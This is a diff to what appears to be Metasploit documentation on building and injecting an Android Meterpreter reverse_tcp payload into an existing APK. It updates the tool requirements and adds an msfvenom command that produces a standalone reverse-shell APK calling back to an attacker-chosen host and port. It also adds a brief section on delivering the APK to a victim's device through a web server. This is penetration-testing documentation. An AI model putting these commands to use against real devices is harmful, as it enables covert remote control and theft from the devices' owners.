@@ -31,12 +31,13 @@ $ adb pull /data/app/com.existing.app-1/base.apk com.existing.apk
 APK Injection (as opposed to generating a single APK payload) requires a few tools
 to be present on your command line already:
 
+* [Java](https://www.oracle.com/java/technologies/downloads/) - Used for building/editing APK
 * [Apktool](https://ibotpeaches.github.io/Apktool/) - Used for rebuilding the APK
 * [keytool](https://docs.oracle.com/javase/8/docs/technotes/tools/unix/keytool.html) - To create and extract signing certificates
-* [jarsigner](https://docs.oracle.com/javase/7/docs/technotes/tools/windows/jarsigner.html) - To re-sign the APK
+* [apksigner](https://developer.android.com/studio/command-line/apksigner) - To re-sign the APK
 
 Installing these tools (if they are not installed already) will depend on your OS.
-Apktool can be installed manually or automatically (e.g `brew install apktool`).
+Apktool can be installed manually or automatically (e.g `brew install apktool` OR `apt install apktool`).
 keytool and jarsigner can be installed by installing the appropriate JDK.
 
 ## Verification Steps
@@ -45,7 +46,16 @@ keytool and jarsigner can be installed by installing the appropriate JDK.
 ./msfvenom -p android/meterpreter/reverse_tcp -x com.existing.apk LHOST=[IP] LPORT=4444 -f raw -o /tmp/android.apk
 ```
 
-Next, start an Android device. Upload the APK, and execute it, as you would with
+## Create Meterpreter APK File
+
+```
+./msfvenom -p android/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f raw -o /tmp/android.apk
+```
+## Sending apk to other Devices:
+
+There are many method to send APK to victim's device but one of the easiest methods is using a web server.
+
+Next, start an Android device. Upload the APK, execute it and run it, as you would with
 a [normal Android meterpreter APK](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/payload/android/meterpreter/reverse_tcp.md).
 
 
